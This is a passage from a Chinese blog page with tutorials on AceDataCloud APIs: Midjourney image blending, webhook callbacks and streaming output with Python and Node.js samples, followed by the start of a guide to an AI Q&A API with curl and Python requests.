                  <p>比如说这里我们一共有两张图片，一张是一只玩具熊，另一张是一个电锯，分别如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/bdzqdc.png" alt=""></p>
                  <p><img src="https://cdn.acedata.cloud/ngdadr.png" alt=""></p>
                  <p>现在我们想把二者融合起来，让这只熊拿着这个电锯，怎么做呢？</p>
                  <p>我们可以构造如下的 prompt：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">https://cdn.acedata.cloud/8fapzl.png https://cdn.acedata.cloud/c1igbw.png The bear is holding the chainsaw --iw 2</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以发现，和 Image with Prompt 类似，我们这里将多张图片 URL 放在了 prompt 开头，并以空格分隔，最后再加上文字 prompt，将如上内容作为一个整体传递给 <code>prompt</code> 参数，运行效果如下：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234547236830973972/kcisok_The_bear_is_holding_the_chainsaw_id8873344_ad605bc4-ba19-4807-b94f-367dab672f7a.png?ex=66312136&amp;is=662fcfb6&amp;hm=0fb1e2261c9a30b04de9da9b23b7562eb73677f1bbda1fae52c7243b12d25aac&amp;width=1024&amp;height=1024"</span>,</span><br><span class="line">  <span class="string">"image_width"</span>: 1024,</span><br><span class="line">  <span class="string">"image_height"</span>: 1024,</span><br><span class="line">  <span class="string">"image_id"</span>: <span class="string">"1234547236830973972"</span>,</span><br><span class="line">  <span class="string">"raw_image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234547236830973972/kcisok_The_bear_is_holding_the_chainsaw_id8873344_ad605bc4-ba19-4807-b94f-367dab672f7a.png?ex=66312136&amp;is=662fcfb6&amp;hm=0fb1e2261c9a30b04de9da9b23b7562eb73677f1bbda1fae52c7243b12d25aac&amp;"</span>,</span><br><span class="line">  <span class="string">"raw_image_width"</span>: 2048,</span><br><span class="line">  <span class="string">"raw_image_height"</span>: 2048,</span><br><span class="line">  <span class="string">"progress"</span>: 100,</span><br><span class="line">  <span class="string">"actions"</span>: [</span><br><span class="line">    <span class="string">"upscale1"</span>,</span><br><span class="line">    <span class="string">"upscale2"</span>,</span><br><span class="line">    <span class="string">"upscale3"</span>,</span><br><span class="line">    <span class="string">"upscale4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"task_id"</span>: <span class="string">"891f2645-ee15-4c7b-ac24-d98163c8e57e"</span>,</span><br><span class="line">  <span class="string">"success"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们就得到了如下结果：</p>
                  <p><img src="https://cdn.acedata.cloud/vjtzdo.png" alt=""></p>
                  <p>可以看到，我们就成功实现了图片融合。</p>
                  <blockquote>
                    <p>注意：图片融合最多可以支持 5 个图片 URL 作为输入，也就是最多支持 5 张图片融合，输入格式同上。</p>
                  </blockquote>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Midjourney 生成图片需要等待一段时间，所以本 API 也默认设计为了长等待模式。但在部分场景下，长等待可能会带来一些额外的资源开销，因此本 API 也提供了异步 Webhook 回调的方式，当图片生成成功或失败时，其结果都会通过 HTTP 请求的方式发送到指定的 Webhook 回调 URL。回调 URL 接收到结果之后可以进行进一步的处理。</p>
                  <p>下面演示具体的调用流程。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/" target="_blank" rel="noopener" title="https://webhook.site/">https://webhook.site/</a>，打开该网站即可得到一个 Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/srf3tq.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <a href="https://webhook.site/995d0a91-d737-40a7-a3b9-5baf68ed924c" target="_blank" rel="noopener" title="https://webhook.site/995d0a91-d737-40a7-a3b9-5baf68ed924c">https://webhook.site/995d0a91-d737-40a7-a3b9-5baf68ed924c</a>。</p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入 <code>prompt</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/hclosy.png" alt=""></p>
                  <p>点击测试之后会立即得到一个 <code>task_id</code> 的响应，用于标识当前生成任务的 ID，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/84i0bg.png" alt=""></p>
                  <p>稍等片刻，等图片生成结束，可以发发现 Webhook URL 收到了一个 HTTP 请求，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/6znvgq.png" alt=""></p>
                  <p>其结果就是当前任务的结果，内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"f6e39eaf-652a-4bf5-a15c-79d8b143b80a"</span>,</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234551030549839932/kcisok_A_cat_sitting_on_a_table_id2724480_591c5c85-ec80-42ab-9fe5-9adfbed192e4.png?ex=663124be&amp;is=662fd33e&amp;hm=da725eb74aae375d60beec38b4cd26c5a7b373b1662f222ff838a8ea6fd5e798&amp;width=1024&amp;height=1024"</span>,</span><br><span class="line">  <span class="attr">"image_width"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"image_height"</span>: <span class="number">1024</span>,</span><br><span class="line">  <span class="attr">"image_id"</span>: <span class="string">"1234551030549839932"</span>,</span><br><span class="line">  <span class="attr">"raw_image_url"</span>: <span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234551030549839932/kcisok_A_cat_sitting_on_a_table_id2724480_591c5c85-ec80-42ab-9fe5-9adfbed192e4.png?ex=663124be&amp;is=662fd33e&amp;hm=da725eb74aae375d60beec38b4cd26c5a7b373b1662f222ff838a8ea6fd5e798&amp;"</span>,</span><br><span class="line">  <span class="attr">"raw_image_width"</span>: <span class="number">2048</span>,</span><br><span class="line">  <span class="attr">"raw_image_height"</span>: <span class="number">2048</span>,</span><br><span class="line">  <span class="attr">"progress"</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">"actions"</span>: [</span><br><span class="line">    <span class="string">"upscale1"</span>,</span><br><span class="line">    <span class="string">"upscale2"</span>,</span><br><span class="line">    <span class="string">"upscale3"</span>,</span><br><span class="line">    <span class="string">"upscale4"</span>,</span><br><span class="line">    <span class="string">"reroll"</span>,</span><br><span class="line">    <span class="string">"variation1"</span>,</span><br><span class="line">    <span class="string">"variation2"</span>,</span><br><span class="line">    <span class="string">"variation3"</span>,</span><br><span class="line">    <span class="string">"variation4"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 <code>success</code> 字段标识了该任务是否执行成功，如果执行成功，还会有同样的 <code>actions</code>, <code>image_id</code>, <code>image_url</code> 字段，和上文介绍的返回结果是一样的，另外还有 <code>task_id</code> 用于标识任务，以实现 Webhook 结果和最初 API 请求的关联。</p>
                  <p>如果图片生成失败，Webhook URL 则会收到类似如下内容：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"7ba0feaf-d20b-4c22-a35a-31ec30fc7715"</span>,</span><br><span class="line">  <span class="attr">"error"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"bad_request"</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"Unrecognized argument(s): `-c`, `x`"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里的 <code>success</code> 字段会是 <code>false</code>，同时还会有 <code>error.code</code> 和 <code>error.message</code> 字段描述了任务错误的详情信息，Webhook 服务器根据对应的结果进行处理即可。</p>
                  <h2 id="流式输出"><a href="#流式输出" class="headerlink" title="流式输出"></a>流式输出</h2>
                  <p>Midjourney 官方在生成图片的时候是有进度的，在最开始是一张模糊的照片，然后经过几次迭代之后，图片逐渐变得清晰，最后得到完整的图片。</p>
                  <p>所以，一张图片的生成过程大约可以分为「发送命令」-&gt;「开始生图（多次迭代逐渐清晰）」-&gt;「生图完毕」的阶段。</p>
                  <p>在没开启流式输出的情况下，本 API 从发起请求到返回结果，实际上是从上述「发送命令」-&gt;「生图完毕」的全过程，中间生图的过程也全被包含在里面，由于 Midjourney 本身生成图片速度较慢，整个过程大约需要等待一分钟或更久。</p>
                  <p>所以为了更好的用户体验，本 API 支持流式输出，即当「开始生图」的时候就开始返回结果，每当绘制进度有变化，就会流式将结果输出，直至生图结束。</p>
                  <p>如果想流式返回响应，可以更改请求头里面的 <code>accept</code> 参数，修改为 <code>application/x-ndjson</code>，不过调用代码需要有对应的更改才能支持流式响应。</p>
                  <p>Python 样例代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://api.acedata.cloud/midjourney/imagine'</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'accept'</span>: <span class="string">'application/x-ndjson'</span>,</span><br><span class="line">    <span class="string">'authorization'</span>: <span class="string">'Bearer &#123;token&#125;'</span></span><br><span class="line">&#125;</span><br><span class="line">body = &#123;</span><br><span class="line">    <span class="string">"prompt"</span>: <span class="string">"a beautiful cat --v 6"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, headers=headers, json=body, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> r.iter_lines():</span><br><span class="line">    print(line.decode())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234558451443699803/eae94f0f-0ba5-4b3c-9bad-59fb33ac2cbc_grid_0.webp?ex=66312ba7&amp;is=662fda27&amp;hm=4625d5f12158bffc07c4faaf6ce75af6f1396122f148b33b91f3e20b48fecc8b&amp;width=256&amp;height=256"</span>,<span class="attr">"image_width"</span>:<span class="number">256</span>,<span class="attr">"image_height"</span>:<span class="number">256</span>,<span class="attr">"image_id"</span>:<span class="string">"1234558451443699803"</span>,<span class="attr">"raw_image_url"</span>:<span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234558451443699803/eae94f0f-0ba5-4b3c-9bad-59fb33ac2cbc_grid_0.webp?ex=66312ba7&amp;is=662fda27&amp;hm=4625d5f12158bffc07c4faaf6ce75af6f1396122f148b33b91f3e20b48fecc8b&amp;"</span>,<span class="attr">"raw_image_width"</span>:<span class="number">512</span>,<span class="attr">"raw_image_height"</span>:<span class="number">512</span>,<span class="attr">"progress"</span>:<span class="number">35</span>,<span class="attr">"actions"</span>:[],<span class="attr">"task_id"</span>:<span class="string">"49589d2c-b6b3-4fbf-9f82-93068509c76f"</span>,<span class="attr">"success"</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234558458595115149/eae94f0f-0ba5-4b3c-9bad-59fb33ac2cbc_grid_0.webp?ex=66312ba9&amp;is=662fda29&amp;hm=9af53fa645127131a88dfbb3930add7abda710c12a3d6c30c457d6a067b36bab&amp;width=256&amp;height=256"</span>,<span class="attr">"image_width"</span>:<span class="number">256</span>,<span class="attr">"image_height"</span>:<span class="number">256</span>,<span class="attr">"image_id"</span>:<span class="string">"1234558458595115149"</span>,<span class="attr">"raw_image_url"</span>:<span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234558458595115149/eae94f0f-0ba5-4b3c-9bad-59fb33ac2cbc_grid_0.webp?ex=66312ba9&amp;is=662fda29&amp;hm=9af53fa645127131a88dfbb3930add7abda710c12a3d6c30c457d6a067b36bab&amp;"</span>,<span class="attr">"raw_image_width"</span>:<span class="number">512</span>,<span class="attr">"raw_image_height"</span>:<span class="number">512</span>,<span class="attr">"progress"</span>:<span class="number">75</span>,<span class="attr">"actions"</span>:[],<span class="attr">"task_id"</span>:<span class="string">"49589d2c-b6b3-4fbf-9f82-93068509c76f"</span>,<span class="attr">"success"</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#123;<span class="attr">"image_url"</span>:<span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234558483408490566/kcisok_A_landscape_painting_of_a_beautiful_sunset_id5963392_eae94f0f-0ba5-4b3c-9bad-59fb33ac2cbc.png?ex=66312baf&amp;is=662fda2f&amp;hm=185ea8f130806bf8bd96911bd251808455fd65596edcdb459f9b3cfd7860387c&amp;width=1024&amp;height=1024"</span>,<span class="attr">"image_width"</span>:<span class="number">1024</span>,<span class="attr">"image_height"</span>:<span class="number">1024</span>,<span class="attr">"image_id"</span>:<span class="string">"1234558483408490566"</span>,<span class="attr">"raw_image_url"</span>:<span class="string">"https://midjourney.cdn.acedata.cloud/attachments/1234291876639674388/1234558483408490566/kcisok_A_landscape_painting_of_a_beautiful_sunset_id5963392_eae94f0f-0ba5-4b3c-9bad-59fb33ac2cbc.png?ex=66312baf&amp;is=662fda2f&amp;hm=185ea8f130806bf8bd96911bd251808455fd65596edcdb459f9b3cfd7860387c&amp;"</span>,<span class="attr">"raw_image_width"</span>:<span class="number">2048</span>,<span class="attr">"raw_image_height"</span>:<span class="number">2048</span>,<span class="attr">"progress"</span>:<span class="number">100</span>,<span class="attr">"actions"</span>:[<span class="string">"upscale1"</span>,<span class="string">"upscale2"</span>,<span class="string">"upscale3"</span>,<span class="string">"upscale4"</span>,<span class="string">"reroll"</span>,<span class="string">"variation1"</span>,<span class="string">"variation2"</span>,<span class="string">"variation3"</span>,<span class="string">"variation4"</span>],<span class="attr">"task_id"</span>:<span class="string">"49589d2c-b6b3-4fbf-9f82-93068509c76f"</span>,<span class="attr">"success"</span>:<span class="literal">true</span>&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，启用流式输出之后，返回结果就是逐行的 JSON 了。</p>
                  <p>在 Node.js 环境中，实现代码可写为如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">"axios"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">"https://api.acedata.cloud/midjourney/imagine"</span>;</span><br><span class="line"><span class="keyword">const</span> headers = &#123;</span><br><span class="line">  <span class="string">"content-type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">  accept: <span class="string">"application/x-ndjson"</span>,</span><br><span class="line">  authorization: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> body = &#123;</span><br><span class="line">  prompt: <span class="string">"a beautiful cat --v 6"</span>,</span><br><span class="line">  action: <span class="string">"generate"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">axios</span><br><span class="line">  .post(url, body, &#123; <span class="attr">headers</span>: headers, <span class="attr">responseType</span>: <span class="string">"stream"</span> &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response.status);</span><br><span class="line">    response.data.on(<span class="string">"data"</span>, (chunk) =&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(chunk.toString());</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">  &#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这些示例运行的结果都是相似的。</p>
                  <p>请注意，流式输出结果中有一个称为 progress 的字段，表示生成进度，范围从 0 到 100。如果需要，您可以在页面上显示这些信息。</p>
                  <blockquote>
                    <p>注意：当生成未完全完成时，<code>actions</code> 字段为空，表示无法对中间图像执行进一步处理操作。生成完成后，在生成过程中生成的 image_url 将被销毁。</p>
                  </blockquote>
                  <p>此外，您可以通过指定 <code>accept=application/x-ndjson</code> 的请求头和 callback_url 的请求体，将流式结果与异步回调结合起来，然后 callback_url 可以接收到多个流式结果的 POST 请求。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-05-30 04:35:22" itemprop="dateCreated datePublished" datetime="2024-05-30T04:35:22+08:00">2024-05-30</time>
                </span>
                <span id="/42347.html" class="post-meta-item leancloud_visitors" data-flag-title="Midjourney Imagine API 申请及使用" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>15k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>13 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42346.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 人工智能 <i class="label-arrow"></i>
                  </a>
                  <a href="/42346.html" class="post-title-link" itemprop="url">如何用 AI 问答 API 彻底改变用户体验！</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>我们知道，市面上一些问答 API 的对接还是相对没那么容易的，比如说 OpenAI 的 Chat Completions API，它有一个 <code>messages</code> 字段，如果要完成连续对话，需要我们把所有的上下文历史全部传递，同时还需要处理 Token 超出限制的问题。</p>
                  <p>AceDataCloud 提供的 AI 问答 API 针对上述情况进行了优化，在保证问答效果不变的情况下，对连续对话的实现进行了封装，对接时无需再关心 messages 的传递，也无需关心 Token 超出限制的问题（API 内部自动进行了处理），同时也提供了对话查询、修改等功能，使得整体的对接大大简化。</p>
                  <p>本文档会介绍下 AI 问答 API 的对接说明。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 API，需要先到 <a href="https://platform.acedata.cloud/documents/59fb1199-6694-4afb-a222-3554d7f7d05a" target="_blank" rel="noopener">AI 问答 API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q6ytrc.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>首先先了解下基本的使用方式，就是输入问题，获得回答，只需要简单地传递一个 <code>question</code> 字段，并指定相应模型即可。</p>
                  <p>比如说询问：“What’s your name？”，我们接下来就可以在界面上填写对应的内容，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/xqxda4.png" alt=""></p>
                  <p>可以看到这里我们设置了 Request Headers，包括：</p>
                  <ul>
                    <li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
                    <li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
                  </ul>
                  <p>另外设置了 Request Body，包括：</p>
                  <ul>
                    <li><code>model</code>：模型的选择，比如主流的 GPT 3.5，GPT 4 等。</li>
                    <li><code>question</code>：需要询问的问题，可以是任意的纯文本。</li>
                  </ul>
                  <p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/dvkps6.png" alt=""></p>
                  <p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"answer"</span>: <span class="string">"I am an AI language model developed by OpenAI and I don't have a personal name. However, you can call me GPT or simply Chatbot. How can I assist you today?"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，这里返回的结果中有一个 <code>answer</code> 字段，就是该问题的回答。我们可以输入任意问题，就可以得到任意的回答。</p>
                  <p>如果你不需要任何多轮对话的支持，这个 API 可以极大方便你的对接。</p>
                  <p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/aichat/conversations' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "gpt-3.5",</span><br><span class="line">  "question": "What's your name?"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Python 的对接代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/aichat/conversations"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"model"</span>: <span class="string">"gpt-3.5"</span>,</span><br><span class="line">    <span class="string">"question"</span>: <span class="string">"What's your name?"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="多轮对话"><a href="#多轮对话" class="headerlink" title="多轮对话"></a>多轮对话</h2>
                  <p>如果您想要对接多轮对话功能，需要传递一个额外参数 <code>stateful</code>，其值为 <code>true</code>，后续的每次请求都要携带该参数。传递了 <code>stateful</code> 参数之后，API 会额外返回一个 <code>id</code> 参数，代表当前对话的 ID，后续我们只需要将该 ID 作为参数传递，就可以轻松实现多轮对话。</p>
                  <p>下面我们来演示下具体的操作。</p>
                  <p>第一次请求，将 <code>stateful</code> 参数设置为 <code>true</code>，并正常传递 <code>model</code> 和 <code>question</code> 参数，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/fn4bi9.png" alt=""></p>
                  <p>对应代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/aichat/conversations' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "gpt-3.5",</span><br><span class="line">  "question": "What's your name?",</span><br><span class="line">  "stateful": true</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以得到如下回答：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
